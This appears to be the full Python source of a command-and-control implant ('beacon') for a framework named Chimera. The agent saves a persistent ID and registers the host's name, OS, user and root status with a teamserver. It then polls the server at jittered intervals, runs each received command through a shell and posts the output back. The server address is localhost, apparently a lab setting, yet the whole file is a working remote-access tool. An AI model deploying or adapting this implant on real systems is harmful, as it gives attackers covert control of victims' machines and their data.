import getpass
import json
import os
import platform
import random
import subprocess
import time
import uuid

import requests


SERVER_URL = "http://127.0.0.1:8000"

# Keep the agent identity stable across restarts.
AGENT_ID_FILE = os.path.expanduser("~/.chimera_agent_id")


def get_agent_id():
    try:
        if os.path.exists(AGENT_ID_FILE):
            with open(AGENT_ID_FILE, "r", encoding="utf-8") as file:
                agent_id = file.read().strip()

            if agent_id:
                return agent_id

        agent_id = str(uuid.uuid4())[:8]

        with open(AGENT_ID_FILE, "w", encoding="utf-8") as file:
            file.write(agent_id)

        return agent_id

    except OSError as exc:
        print(f"[-] Could not persist agent ID: {exc}")
        return str(uuid.uuid4())[:8]


AGENT_ID = get_agent_id()


def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_release": platform.release(),
        "user": getpass.getuser(),
        "ip": "127.0.0.1",
        "cpu_cores": os.cpu_count() or 1,
    }


def register():
    system_info = get_system_info()

    payload = {
        "agent_id": AGENT_ID,
        **system_info,
        "is_privileged": os.geteuid() == 0 if hasattr(os, "geteuid") else False,
    }

    try:
        response = requests.post(
            f"{SERVER_URL}/api/v1/beacon/register",
            json=payload,
            timeout=5,
        )

        response.raise_for_status()

        print(f"[+] Registered Agent ID: {AGENT_ID}")
        print(
            f"[*] Host: {system_info['hostname']} | "
            f"OS: {system_info['os']} {system_info['os_release']} | "
            f"User: {system_info['user']}"
        )

        return response.json()

    except requests.exceptions.RequestException as exc:
        print(f"[-] Registration failed: {exc}")
        return None


def execute_command(command: str):
    try:
        process = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15,
        )

        output = process.stdout if process.stdout else process.stderr

        return output, process.returncode

    except subprocess.TimeoutExpired:
        return "Command timed out after 15 seconds.", 124

    except Exception as exc:
        return str(exc), 1


def poll_once():
    response = requests.post(
        f"{SERVER_URL}/api/v1/beacon/poll",
        json={"agent_id": AGENT_ID},
        timeout=5,
    )

    response.raise_for_status()

    return response.json().get("task")


def submit_result(task_id, output, exit_code):
    payload = {
        "task_id": task_id,
        "agent_id": AGENT_ID,
        "output": output,
        "exit_code": exit_code,
    }

    response = requests.post(
        f"{SERVER_URL}/api/v1/beacon/result",
        json=payload,
        timeout=5,
    )

    response.raise_for_status()


def beacon_loop():
    print(f"[*] Starting beacon polling loop for {AGENT_ID}...")

    while True:
        try:
            task = poll_once()

            if task:
                task_id = task.get("task_id")
                command = task.get("command")

                if not task_id or not command:
                    print("[-] Received malformed task.")
                else:
                    print(f"[*] Received Task [{task_id}]")

                    output, exit_code = execute_command(command)

                    submit_result(
                        task_id,
                        output,
                        exit_code,
                    )

                    print(f"[+] Posted results for Task [{task_id}]")

            else:
                print("[*] No task available.")

        except requests.exceptions.RequestException as exc:
            print(f"[-] Teamserver request failed: {exc}")

        except Exception as exc:
            print(f"[-] Unexpected agent error: {exc}")

        sleep_duration = random.uniform(4.0, 8.0)
        time.sleep(sleep_duration)


if __name__ == "__main__":
    if register():
        beacon_loop()